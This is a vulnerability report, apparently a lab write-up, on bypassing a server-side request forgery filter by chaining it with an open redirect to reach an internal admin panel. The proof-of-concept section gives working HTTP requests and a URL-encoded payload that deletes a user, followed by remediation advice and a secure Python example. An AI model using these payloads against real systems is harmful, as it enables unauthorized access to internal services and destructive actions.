# Vulnerability Report: Server-Side Request Forgery (SSRF) Filter Bypass via Open Redirection Chaining

* **Vulnerability Type:** Server-Side Request Forgery (SSRF) (CWE-918) / URL Redirection to Untrusted Site ('Open Redirect') (CWE-601)

* **Severity:** High

* **Target Component:** Stock Check API (`/product/stock`) & Product Navigation API (`/product/nextProduct`)

* **OWASP Top 10 Mapping:** A10:2021 – Server-Side Request Forgery (SSRF)

## 1. Executive Summary

A critical security flaw was identified where a strict Server-Side Request Forgery (SSRF) filter was bypassed by chaining it with an Open Redirection vulnerability. While the stock check feature restricts inputs to local relative application paths, an unauthenticated attacker can supply the path of an open redirector host parameter (`/product/nextProduct?path=...`). When the backend HTTP client executes the initial local request, it follows the subsequent HTTP 302 redirect to an arbitrary internal IP address (`http://192.168.0.12:8080/admin`), enabling full access to restricted back-end administrative interfaces and user deletion functionality.

## 2. Technical Analysis & Root Cause

The application implements strict path-based validation on the `stockApi` parameter, rejecting any input containing explicit protocol schemes (`http://` or `https://`) or target hostnames.

### Vulnerability Chain Mechanics

1. **Path Filtering:** The `stockApi` validator enforces that all submitted strings start with a local URL path (e.g., `/product/...`).
2. **Open Redirect Vector:** The `/product/nextProduct` endpoint accepts a `path` parameter and redirects the user (or HTTP client) to whatever destination is specified in `path` without domain validation.
3. **Implicit Redirect Handling:** The backend HTTP client processing `stockApi` is configured to automatically follow HTTP 301/302 redirects without re-validating the target destination of the redirect response.

```
[ Attacker ]
     |
     | POST /product/stock 
     | stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin
     v
[ Web Server ] --- (1. Local Request) ---> [ /product/nextProduct ]
     ^                                              |
     |                                   (2. 302 Redirect to IP)
     |                                              v
     +------------ (3. Fetches Admin) <--- [ 192.168.0.12:8080/admin ]
```

## 3. Proof of Concept (PoC)

1. Intercept a stock check request (`POST /product/stock`) in an HTTP proxy (e.g., Burp Suite).
2. Inspect product navigation controls to locate the open redirection vector:
   ```http
   GET /product/nextProduct?currentProductId=1&path=/product?productId=2 HTTP/1.1
   Host: target-app.net
   ```
3. Verify the open redirect by passing an external domain in the `path` parameter:
   ```text
   /product/nextProduct?currentProductId=1&path=https://example.com
   ```
   *Result:* The server responds with `HTTP/1.1 302 Found` and `Location: https://example.com`.

4. Construct the SSRF exploit payload targeting the internal administrative service at `192.168.0.12:8080`:
   ```text
   /product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin/delete?username=carlos
   ```

5. URL-encode the payload and place it into the `stockApi` parameter:
   ```http
   POST /product/stock HTTP/1.1
   Host: target-app.net
   Content-Type: application/x-www-form-urlencoded

   stockApi=%2fproduct%2fnextProduct%3fcurrentProductId%3d1%26path%3dhttp%3a%2f%2f192.168.0.12%3a8080%2fadmin%2fdelete%3fusername%3dcarlos
   ```

6. **Result:** The application validates the initial path as local, executes the request, follows the internal redirect to `192.168.0.12:8080`, deletes user `carlos`, and returns `200 OK`.

## 4. Impact

* **Bypass of Strict Access Controls:** Path-restriction defenses are completely invalidated when open redirection vectors exist on the target server.
* **Unauthorized Access to Internal Networks:** Unauthenticated attackers can interact with isolated internal microservices.
* **Administrative Account Manipulation:** Execution of privileged tasks on back-end components.

## 5. Remediation & Developer Guidance

### Primary Fixes

1. **Fix Open Redirection Vulnerabilities:**
   Validate all redirect destinations against a strict allowlist of relative paths or known trusted domains. Never allow arbitrary URLs in redirect parameters.

2. **Disable Automatic Redirect Following in HTTP Clients:**
   Configure server-side HTTP libraries to explicitly disable following HTTP 3xx redirects (`allow_redirects=False`). Inspect redirect headers manually prior to issuing follow-up requests.

3. **Re-Validate Redirect Targets:**
   If following redirects is necessary, pass the target `Location` header back through the input validation pipeline before executing the secondary request.

#### Secure Code Implementation Example (Python)

```
import urllib.parse
import requests

def safe_stock_check(user_path):
    # Enforce strict relative path validation
    if not user_path.startswith("/product/"):
        raise ValueError("Invalid target path")

    base_url = "https://internal-app.local"
    full_url = urllib.parse.urljoin(base_url, user_path)

    # Disable automatic redirect following to prevent chained SSRF
    response = requests.get(full_url, allow_redirects=False, timeout=3)
    
    if response.is_redirect:
        raise ValueError("Redirection detected and blocked to prevent SSRF.")
        
    return response.text
```

## 6. References

* **CWE-918:** [Server-Side Request Forgery (SSRF)](https://cwe.mitre.org/data/definitions/918.html)
* **CWE-601:** [URL Redirection to Untrusted Site ('Open Redirect')](https://cwe.mitre.org/data/definitions/601.html)
* **OWASP:** [Server-Side Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)